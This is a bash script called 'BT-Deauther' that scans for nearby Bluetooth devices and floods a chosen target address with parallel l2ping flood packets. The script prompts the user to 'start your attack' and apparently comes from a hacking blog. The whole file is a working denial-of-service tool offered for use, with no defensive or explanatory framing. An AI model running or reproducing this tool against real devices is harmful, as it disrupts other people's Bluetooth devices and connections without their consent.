#!/bin/bash

grey="\033[0;37m"
nc="\e[0m"
red="\033[1;31m"
green="\033[1;32m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
yellow="\033[1;33m"
Purple="\033[0;35m"
figlet BT-Deauther
spinner() {
    local i sp n
    sp='/-\|'
    n=${#sp}
    printf ' '
    while sleep 0.1; do
        printf "%s\b" "${sp:i++%n:1}"
    done
}
clear
sudo lsmod | grep blue &>/dev/null
systemctl enable bluetooth.service &>/dev/null
systemctl start bluetooth.service &>/dev/null
if rfkill unblock bluetooth ;then
figlet BT-Deauther
echo  -e "\033[33;5mMade By ANIKET\033[0m"
echo  -e "\033[33;7mhttps://hackingvila.wordpress.com"
printf "Please wait Starting deauther"
spinner &
sleep 4 
kill "$!" # kill the spinner
printf '\n'
clear
echo -e "$green Your Bluetooth is Turned On$nc"
else echo -e "Some Problem With Turning On Bluetooth"
fi
echo -e ""
echo -e "$red [*]BLUTOOTH DEVICE(B.D) INFO AND SCANNING$nc"
printf '\n'
hciconfig -a
printf '\n'
hcitool scan
start=1
FileName=${0##*/}
echo -e ""
echo -e ""
read -p $'\033[1;33m[*]Enter the interface (default: hci0):  \033[1;33m' -e -i 'hci0' interface || interface="hci0"
read -p $'\033[1;33m[*]Enter B.D.Address (xx:xx:xx:xx:xx:xx) : \033[0m' bdadd
read -p $'\033[0;33m[*]Enter packet size (default:399 bytes, max:999 bytes):  \033[0;35m' -e -i '399' packet || packet="399"
read -p $'\033[1;31m[*]Enter the number of Threads (default: 5): \033[1;31m' -e -i '5' cycle || cycle="5"
if [ -z "$interface" ] || [ -z "$bdadd" ] || [ -z "$packet" ] || [ -z "$cycle" ]; then
   printf '\n\n\n'
   printf '%s\n' "Please complete all the input AREA & Try again"
   sleep 2
   ./$FileName
else
echo -e "" 
read -p $'\033[1;33m[*]PRESS ENTER TO START YOUR ATTACK\033[0m'
fi
for (( c=$start; c<=$cycle; c++ ))
do
	xterm -hold -e l2ping -i $interface -f -s $packet $bdadd&
done
echo  -e "\033[33;5mMade By ANIKET\033[0m"
echo  -e "\033[33;7mhttps://hackingvila.wordpress.com"
